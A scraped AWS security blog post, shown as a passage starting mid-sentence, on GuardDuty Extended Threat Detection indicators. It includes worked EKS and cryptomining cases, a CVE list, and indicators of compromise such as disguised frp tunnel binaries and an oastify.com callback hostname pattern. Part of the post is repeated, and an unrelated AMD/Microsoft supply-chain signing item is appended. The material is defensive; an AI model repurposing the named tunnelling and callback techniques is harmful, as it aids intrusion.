own, doesn’t clearly point to a threat which the five new indicators fall into. A single Common Vulnerabilities and Exposures (CVE) finding on a host, for instance, tells you a vulnerability exists not that an attacker is exploiting it. These findings earn their value when GuardDuty correlates them with the suspicious-activity signals it already tracks, as shown in the following table: Indicator Source What it tells you VULNERABILITY Amazon Inspector CVE list with Common Vulnerability Scoring System (CVSS) severity and Exploit Prediction Scoring System (EPSS) exploit-likelihood scores. MALICIOUS_PACKAGE Amazon Inspector Amazon Inspector MAL-* package indicators. For more on how Amazon Inspector scores vulnerabilities, see Amazon Inspector Security Research. REACHABILITY Amazon VPC Reachability Analyzer Whether the host or cluster is reachable from the internet MISCONFIGURATION AWS Security Hub controls (posture management) The resource has configuration that doesn’t align with AWS or industry best practices . For example, IMDSv1 still enabled, overly permissive admin policies, or publicly accessible Amazon Simple Storage Service (Amazon S3) buckets. SENSITIVE_DATA Amazon Macie Potential sensitive data has been discovered in the resource. The five values appear on the Indicators tab of the attack-sequence finding in the AWS Management Console for GuardDuty and in the GetFindings JSON file. Figure 1: Indicators section of an attack sequence finding A note on EPSS, because the VULNERABILITY indicator carries it. According to the FIRST EPSS overview , the score is the probability that a published CVE will be exploited in the wild in the next 30 days ranging from 0 to 1. EPSS doesn’t replace CVSS, which describes the inherent severity of a vulnerability, whereas EPSS describes how likely it is to be exploited soon making it the more useful number for incident response. Prerequisites To populate the indicators, you need to have the following AWS services enabled: Amazon Inspector on Amazon EC2 and Amazon EKS to support VULNERABILITY and MALICIOUS_PACKAGE . AWS Security Hub powers MISCONFIGURATION based on AWS Foundational Security Best Practices . Amazon VPC Reachability Analyzer on production VPCs to support REACHABILITY . GuardDuty Runtime Monitoring on Amazon EC2, Amazon ECS, and Amazon EKS. Every signal it produces is a potential anchor. Amazon Macie powers SENSITIVE_DATA . Strengthening weak runtime signals Runtime signals such as a process invocation, a pod exec, or a syscall pattern can be noisy sometimes. A single runtime signal that doesn’t match a known offensive-tool path isn’t significant on its own, and without resource-state context it typically stays below the threshold for a Critical attack sequence. The new indicators supply that missing context. When Extended Threat Detection sees a weak runtime signal on a host that also carries a combination of high-priority unpatched CVEs, a known malicious package, an IMDS misconfiguration, and internet reachability, it promotes the collection to a single CRITICAL attack sequence with high confidence. Customer feedback on individual GuardDuty runtime findings has consistently identified noise as a major pain point and adding this resource-state context is what turns those weak signals into actionable alerts. In practice, this surfaces as a substantial increase in net-new attack-sequence findings on the runtime-process surface to roughly one in four prioritized runtime-process attack sequences, with little change on the network-indicator of compromise (IOC) surface. Within the first week of launch, this pattern showed up across many customer accounts where attack sequences that would previously have surfaced as a collection of weaker, unconnected findings now surface as a single CRITICAL finding. Example: A net-new attack sequence on Amazon EKS Now that you understand how Extended Threat Detection has improved through additional indicators, let’s walk through an example of how these indicators add value. In this example we analyze an actual scenario that was observed on an Amazon EKS cluster. The observed activity occurred over an 8-day period with eleven different GuardDuty findings. Figure 2: Activity summary for the EKS cluster before Extended Threat Detection correlated the signals What GuardDuty saw on the activity surface over 8 days as shown in Figure 2 was 55 EKS_AUDIT_LOGS signals across pod execs, role assumptions, and AssumeRoleWithWebIdentity calls and 18 finding-level signals all originating from one external IP address of 198.51.100.69. This IP address authenticated as four distinct AWS Identity and Access Management (IAM) identities to the same EKS cluster. Runtime activity on the worker nodes was generic because there was no process that matched a known offensive-tool path and no execution-profile flag was fired. Under the pre-launch correlation, this sequence would have needed the EKS_MALICIOUS_PROCESS rule to fire, which requires either a malicious exec path or an unusual-suspicious-tool profile. Neither was present in this activity, so no correlated attack-sequence finding was raised. What the new GuardDuty Extended Threat Detection indicators added to the EKS example: MALICIOUS_PACKAGE on the cluster: Amazon Inspector identifier MAL-2022-4933 . VULNERABILITY (full Amazon Inspector output) on the cluster: 42 CVEs total, 33 rated CRITICAL by CVSS. On the cluster: 12 CVEs including CVE-2022-1471 (SnakeYAML deserialization, EPSS 0.94), CVE-2024-4577 (PHP-CGI argument injection, EPSS 0.97), CVE-2024-34351 (Next.js SSRF), CVE-2025-29927 (Next.js authentication bypass), CVE-2023-44487 (HTTP/2 Rapid Reset), and CVE-2022-37434 (zlib heap overflow, EPSS 0.92). Across the five worker nodes: 379 CVEs total, with 68 of them marked CRITICAL by Amazon Inspector. REACHABILITY : Cluster API endpoint internet-reachable and three of five worker nodes also internet-reachable. MISCONFIGURATION (EC2 IMDS): All five worker nodes still expose IMDSv1. When these additional indicators are taken into consideration, this surfaces as a single AttackSequence:EKS/CompromisedCluster with a CRITICAL severity, with all four populated indicators on the Indicators tab and a MITRE ATT&CK® mapping to Initial Access (External Remote Services), Discovery, and Persistence. Figure 3: New vulnerability indicators within an attack sequence The finding lists more than 100 Amazon EC2 CVEs at the worker-node level, one CRITICAL CVSS, plus a long HIGH tail, but most are LOW vulnerability priority because their EPSS scores are low. Rather than sifting through more than 100 findings to decide which to address first, GuardDuty highlights the high-priority ones so you can focus your response efforts where they have the most impact. Example: Cryptomining and a vulnerable host In this second example we walk through an EC2 instance group where GuardDuty already had a strong network-based finding for cryptomining and the new indicators provided additional remediation context that made incident response faster. Figure 4: Cryptomining attack on EC2 instances A set of EC2 instances was communicating with a known cryptomining destination, which was flagged by threat intelligence as mining/misc . The network IOC evidence was strong on its own. Observations added by the new indicators : VULNERABILITY listed CVE-2007-4559 Python tarfile with EPSS around 0.9 on two of the three involved instances. Result : The AttackSequence:EC2/CompromisedInstanceGroup finding is now actionable beyond block the destination IP ; it tells you which patch will remediate the vulnerability the cryptominer likely came in through so you can address the underlying entry point rather than only removing the outbound connection. This attack sequence would have been generated without the vulnerability context because GuardDuty had strong evidence of cryptomining of the EC2 instance group, however, triaging is faster with more context. Indicators of compromise observed across the first-week launch sample The following CVEs listed, along with their EPSS scores at the time, were observed on hosts across the customer accounts that received the new Extended Threat Detection indicators during the first week after launch at the moment each indicator finding was generated. EPSS scores are point-in-time, so a CVE’s listed priority on any future finding will reflect the current EPSS rather than the values shown here. CVE-2024-4577 – PHP-CGI argument injection on Windows. EPSS 0.97+. CVE-2022-1471 – SnakeYAML deserialization. EPSS 0.94. Critical CVSS. CVE-2022-37434 – zlib heap buffer overflow. EPSS 0.92. CVE-2007-4559 – Python tarfile path-traversal. EPSS still 0.9+ in 2026. CVE-2025-29927 – Next.js authentication bypass. Frequent on Node web tiers. CVE-2024-34351 – Next.js SSRF. CVE-2023-44487 – HTTP/2 Rapid Reset. Runtime monitoring surfaced weak signals tied to malware and tooling artifacts recovered from the compromised hosts: HackTool family Linux/frp (Fast Reverse Proxy variants were used as command-and-control tunnels), often disguised as kuboard-agent and kuboard-agent-server binaries on Amazon EKS worker nodes. Container-snapshot path matches were also observed under /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/.../usr/bin/ . The frp binaries are present inside the container image and on the node, which means rebuilding the node from an unpatched AMI won’t be sufficient remediation. Burp Collaborator out-of-band callback hostnames were found under *[.]oastify[.]com , matching pattern <35-char base32>[.]oastify[.]com . These co-occurred with frp on the same EKS sequence, probably a second tool or actor on shared infrastructure. The Amazon Inspector malicious-package indicator MAL-2022-4933 was found in both Amazon EC2 and Amazon EKS contexts. Identity and access patterns correlated with the tooling signals above: A single external source IP authenticated as multiple distinct human IAM identities across separate Amazon EKS, Amazon ECS, and Amazon EC2 surfaces over a short window. This was the most common identity signature on the new Amazon EKS-process net-new class. Responding to attack sequences with these indicators The new indicators don’t change incident-response runbooks for attack sequences that have already occurred. They matter for new findings, which are concentrated on enhancing signals related to runtime monitoring. For those: Treat the sequence with urgency . MALICIOUS_PACKAGE and a high-priority VULNERABILITY mean the host was, and still is, at risk of being compromised. Contain the exposures and remediate the vulnerabilities. Rotate every IAM credential, instance profile , or IAM Roles for Service Accounts (IRSA)-bound role that could have been exposed. Patch on EPSS-weighted priority , not alone on raw CVSS. The finding’s high-priority VULNERABILITY list is already filtered to high-EPSS CVEs. Isolate public resources indicated by REACHABILITY indicators. An internet-reachable host with exploitable vulnerabilities should be isolated for remediation. For more support, see the remediation steps in Remediating detected GuardDuty security findings and GuardDuty Investigation , an AI-powered security analysis of your GuardDuty findings and accounts. Conclusion GuardDuty Extended Threat Detection can deliver more high-confidence attack sequence findings on the runtime workload surfaces where your security teams often need help most: Amazon EC2, Amazon ECS, and Amazon EKS. It does this by combining GuardDuty activity signals with resource-state context from other AWS services. Customer feedback on individual GuardDuty runtime findings has consistently identified noise as a major pain point, and correlating those weak signals with vulnerability, package-risk, reachability, misconfiguration, and sensitive-data indicators is how Extended Threat Detection turns the noise into actionable CRITICAL findings. If you’ve already enabled AWS Security Hub, Amazon Inspector, Amazon VPC Reachability Analyzer, Macie, and GuardDuty Runtime Monitoring, the new indicators automatically start showing up on your attack-sequence findings. If you aren’t using these services, we encourage you to explore enabling them to access the new GuardDuty Extended Threat Detection indicators and the value that these individual services deliver. If you have feedback about this post, submit comments in the Comments section below. If you have questions about this post, start a new thread on AWS re:Post or contact AWS Support . Aman Khare Aman is a senior software developer at AWS GuardDuty. He works on Extended Threat Detection , helping customers pinpoint the malicious attack chains detected in AWS infrastructure. Previously, he led performance and resiliency work on Amazon OpenSearch. Including 10x cluster-manager memory reductions and enabling 1K-node clusters. Outside work, Aman enjoys traveling, adventure activities, reading and playing board games. Kyle Koeller Kyle is a security engineer in the Amazon GuardDuty team with a focus on threat detection. He’s passionate about cloud threat detection and offensive security and holds CompTIA Security+, PenTest+, CompTIA Network Vulnerability Assessment Professional, and SecurityX certifications. When not working, Kyle enjoys spending his time in the gym and exploring New York City.

Example: Cryptomining and a vulnerable host

In this second example we walk through an EC2 instance group where GuardDuty already had a strong network-based finding for cryptomining and the new indicators provided additional remediation context that made incident response faster.

Figure 4: Cryptomining attack on EC2 instances

A set of EC2 instances was communicating with a known cryptomining destination, which was flagged by threat intelligence as mining/misc. The network IOC evidence was strong on its own.

  • Observations added by the new indicators: VULNERABILITY listed CVE-2007-4559 Python tarfile with EPSS around 0.9 on two of the three involved instances.
  • Result: The AttackSequence:EC2/CompromisedInstanceGroup finding is now actionable beyond block the destination IP; it tells you which patch will remediate the vulnerability the cryptominer likely came in through so you can address the underlying entry point rather than only removing the outbound connection.

This attack sequence would have been generated without the vulnerability context because GuardDuty had strong evidence of cryptomining of the EC2 instance group, however, triaging is faster with more context.

Indicators of compromise observed across the first-week launch sample

The following CVEs listed, along with their EPSS scores at the time, were observed on hosts across the customer accounts that received the new Extended Threat Detection indicators during the first week after launch at the moment each indicator finding was generated. EPSS scores are point-in-time, so a CVE’s listed priority on any future finding will reflect the current EPSS rather than the values shown here.

  • CVE-2024-4577 – PHP-CGI argument injection on Windows. EPSS 0.97+.
  • CVE-2022-1471 – SnakeYAML deserialization. EPSS 0.94. Critical CVSS.
  • CVE-2022-37434 – zlib heap buffer overflow. EPSS 0.92.
  • CVE-2007-4559 – Python tarfile path-traversal. EPSS still 0.9+ in 2026.
  • CVE-2025-29927 – Next.js authentication bypass. Frequent on Node web tiers.
  • CVE-2024-34351 – Next.js SSRF.
  • CVE-2023-44487 – HTTP/2 Rapid Reset.

Runtime monitoring surfaced weak signals tied to malware and tooling artifacts recovered from the compromised hosts:

  • HackTool family Linux/frp (Fast Reverse Proxy variants were used as command-and-control tunnels), often disguised as kuboard-agent and kuboard-agent-server binaries on Amazon EKS worker nodes. Container-snapshot path matches were also observed under /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/.../usr/bin/. The frp binaries are present inside the container image and on the node, which means rebuilding the node from an unpatched AMI won’t be sufficient remediation.
  • Burp Collaborator out-of-band callback hostnames were found under *[.]oastify[.]com, matching pattern <35-char base32>[.]oastify[.]com. These co-occurred with frp on the same EKS sequence, probably a second tool or actor on shared infrastructure.
  • The Amazon Inspector malicious-package indicator MAL-2022-4933 was found in both Amazon EC2 and Amazon EKS contexts.

Identity and access patterns correlated with the tooling signals above:

  • A single external source IP authenticated as multiple distinct human IAM identities across separate Amazon EKS, Amazon ECS, and Amazon EC2 surfaces over a short window. This was the most common identity signature on the new Amazon EKS-process net-new class.
Responding to attack sequences with these indicators

The new indicators don’t change incident-response runbooks for attack sequences that have already occurred. They matter for new findings, which are concentrated on enhancing signals related to runtime monitoring. For those:

  1. Treat the sequence with urgency. MALICIOUS_PACKAGE and a high-priority VULNERABILITY mean the host was, and still is, at risk of being compromised. Contain the exposures and remediate the vulnerabilities. Rotate every IAM credential, instance profile, or IAM Roles for Service Accounts (IRSA)-bound role that could have been exposed.
  2. Patch on EPSS-weighted priority, not alone on raw CVSS. The finding’s high-priority VULNERABILITY list is already filtered to high-EPSS CVEs.
  3. Isolate public resources indicated by REACHABILITY indicators. An internet-reachable host with exploitable vulnerabilities should be isolated for remediation.

For more support, see the remediation steps in Remediating detected GuardDuty security findings and GuardDuty Investigation, an AI-powered security analysis of your GuardDuty findings and accounts.

Conclusion

GuardDuty Extended Threat Detection can deliver more high-confidence attack sequence findings on the runtime workload surfaces where your security teams often need help most: Amazon EC2, Amazon ECS, and Amazon EKS. It does this by combining GuardDuty activity signals with resource-state context from other AWS services. Customer feedback on individual GuardDuty runtime findings has consistently identified noise as a major pain point, and correlating those weak signals with vulnerability, package-risk, reachability, misconfiguration, and sensitive-data indicators is how Extended Threat Detection turns the noise into actionable CRITICAL findings. If you’ve already enabled AWS Security Hub, Amazon Inspector, Amazon VPC Reachability Analyzer, Macie, and GuardDuty Runtime Monitoring, the new indicators automatically start showing up on your attack-sequence findings. If you aren’t using these services, we encourage you to explore enabling them to access the new GuardDuty Extended Threat Detection indicators and the value that these individual services deliver.

If you have feedback about this post, submit comments in the Comments section below. If you have questions about this post, start a new thread on AWS re:Post or contact AWS Support.

Aman Khare

Aman is a senior software developer at AWS GuardDuty. He works on Extended Threat Detection, helping customers pinpoint the malicious attack chains detected in AWS infrastructure. Previously, he led performance and resiliency work on Amazon OpenSearch. Including 10x cluster-manager memory reductions and enabling 1K-node clusters. Outside work, Aman enjoys traveling, adventure activities, reading and playing board games.

Kyle Koeller

Kyle is a security engineer in the Amazon GuardDuty team with a focus on threat detection. He’s passionate about cloud threat detection and offensive security and holds CompTIA Security+, PenTest+, CompTIA Network Vulnerability Assessment Professional, and SecurityX certifications. When not working, Kyle enjoys spending his time in the gym and exploring New York City.

items.title: Strengthening Semiconductor Supply Chain Trust with Microsoft’s Artifact Signing and Transparency
items.summary: As enterprises expand their use of Confidential Computing in the cloud and in AI infrastructure, the security of the underlying hardware is more critical than ever. Organizations and their customers need confidence not only in the software they deploy, but also in the silicon and firmware executing their most sensitive workloads. AMD and Microsoft are collaborating to demonstrate how signing and transparency can strengthen trust in the semiconductor supply chain. By combining AMD Device Provenance with Microsoft’s Artifact Signing and Signing Transparency , we are exploring how device provenance, signing, and transparency could work together to support independently verifiable hardware evidence. Why Hardware Provenance Needs Transparency Provenance evidence is most useful when it can be independently verified and evaluated alongside related supply chain evidence. Semiconductor manufacturers generate evidence across selected manufacturing and lifecycle stages, which may describe relevant device attributes, manufacturing events, and validation activities. A digitally signed record establishes who issued information and its integrity. Individual signatures alone do not provide a durable and independently verifiable record of the order in which they were issued, whether they were recorded consistently, or whether unexpected activity occurred in the interval. Transparency addresses this gap. Microsoft's Signing Transparency leverages confidential computing to create a verified, tamper-evident record of signing events, allowing customers and auditors to confirm that evidence was recorded and has not been silently changed or been removed. It applies the Zero Trust principle of “trust but Verify” by giving relying parties cryptographic proof they can evaluate directly. Extending Transparency from Software to Silicon Microsoft's Signing Transparency was designed to address software supply chain threats that traditional code signing alone cannot fully prevent. The same principles can be applied to firmware, hardware provenance, and other evidence generated across the physical supply chain. AMD Device Provenance is designed to provide visibility into the manufacturing and lifecycle of data center components. Through our collaboration, AMD and Microsoft are demonstrating how this evidence can be signed, made transparent, and independently validated. This approach provides several important benefits: Transparent provenance: Changes to signed hardware evidence can be detected rather than silently accepted. Independent validation: Customers can independently validate the integrity, signing history, and transparency records associated with provenance evidence while still applying their own trust requirements to the evidence issuer. Stronger accountability: Transparency creates a durable record of signing events, providing evidence that can help identify unexpected patterns or unauthorized signatures. Audit and compliance evidence: Verifiable records may help inform supplier assessments, regulatory inquiries, and internal due diligence. Standards-based portability: Evidence can be validated across organizational boundaries using interoperable IETF specifications, including RFC 9943, An Architecture for Trustworthy and Transparent Digital Supply Chains , RFC 9942, CBOR Object Signing and Encryption Receipts , and RFC 9995, CBOR Object Signing and Encryption Hash Envelope , rather than proprietary trust mechanisms. Together, these capabilities allow relying parties to verify the origin, integrity, registration, and device binding of manufacturer-issued provenance evidence. Learn More at OCP Global Summit At OCP Global Summit 2026, AMD and Microsoft will present a proof-of-concept demonstration that prototypes how these components could operate together. Visit the AMD (#C61) booth to see the demonstration and learn how AMD and Microsoft are advancing semiconductor supply chain security. To dive deeper into the demo details read AMD’s blog Advancing Semiconductor Supply Chain Assurance . Organizations interested in applying Artifact Signing and Signing Transparency to software, firmware, or hardware can also join the Artifact Signing with Signing Transparency preview community to learn more and help shape the future of the service.
